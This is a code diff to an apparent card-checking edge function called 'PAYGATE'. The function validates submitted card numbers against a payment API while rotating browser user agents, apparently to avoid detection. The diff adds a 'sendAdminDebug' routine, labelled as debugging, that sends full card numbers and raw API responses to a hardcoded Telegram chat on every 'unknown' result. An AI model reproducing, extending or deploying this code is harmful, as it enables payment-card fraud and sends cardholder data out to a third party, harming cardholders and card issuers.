@@ -10,6 +10,8 @@ const corsHeaders = {
 
 const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
 const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
+const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
+const ADMIN_CHAT_ID = "8496943061";
 
 const userAgents = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
@@ -20,6 +22,34 @@ const userAgents = [
 ];
 
 const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];
+
+// Send admin debug notification for UNKNOWN results
+const sendAdminDebug = async (cc: string, rawResponse: string, apiMessage: string): Promise<void> => {
+  if (!TELEGRAM_BOT_TOKEN) {
+    console.log('[PAYGATE] No Telegram bot token - skipping admin debug');
+    return;
+  }
+
+  try {
+    const message = `🔍 <b>PAYGATE DEBUG - UNKNOWN</b>\n\n` +
+      `💳 <b>Card:</b> <code>${cc}</code>\n\n` +
+      `📋 <b>API Message:</b>\n<code>${apiMessage}</code>\n\n` +
+      `📦 <b>Raw Response:</b>\n<pre>${rawResponse.substring(0, 1500)}</pre>`;
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: ADMIN_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML',
+      }),
+    });
+    console.log('[PAYGATE] Admin debug sent for UNKNOWN result');
+  } catch (error) {
+    console.error('[PAYGATE] Failed to send admin debug:', error);
+  }
+};
 
 // Extract single key response message from API
 const extractResponseMessage = (data: Record<string, unknown>): string => {
@@ -240,6 +270,11 @@ serve(async (req) => {
 
     // Perform check with automatic retry for UNKNOWN responses
     const data = await performCheck(cc, userAgent);
+
+    // Send admin debug for UNKNOWN results (fire-and-forget)
+    if (data.computedStatus === "unknown") {
+      sendAdminDebug(cc, data.rawResponse as string || '', data.apiMessage as string || '');
+    }
 
     return new Response(
       JSON.stringify(data),
